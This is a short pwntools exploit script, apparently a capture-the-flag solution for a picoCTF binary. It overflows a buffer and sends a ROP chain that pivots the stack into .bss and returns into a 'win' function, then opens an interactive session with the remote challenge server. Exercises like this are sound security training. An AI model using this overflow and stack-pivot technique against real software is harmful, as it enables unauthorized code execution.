#!/usr/bin/env python3

from pwn import *

exe = ELF("./vuln_patched")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        gdb.attach(r)
    else:
        r = remote("saturn.picoctf.net", 58618)

    return r

bss = exe.bss() + 0x100
rop = ROP(exe)
pop_ebp_ret = rop.find_gadget(["pop ebp", "ret"])[0]
ret_gadget = rop.find_gadget(["ret"])[0]
vuln_printf_call = 0x8049ecf

def main():
    r = conn()
    payload = b"a" * 0xa
    payload += p32(bss)
    payload += p32(exe.symbols["win"] + 3)
    payload += p32(ret_gadget)
    payload += p32(pop_ebp_ret)
    payload += p32(bss - 0x40 + 0xa)
    payload += p32(vuln_printf_call)
    r.sendline(payload)
    r.interactive()


if __name__ == "__main__":
    main()
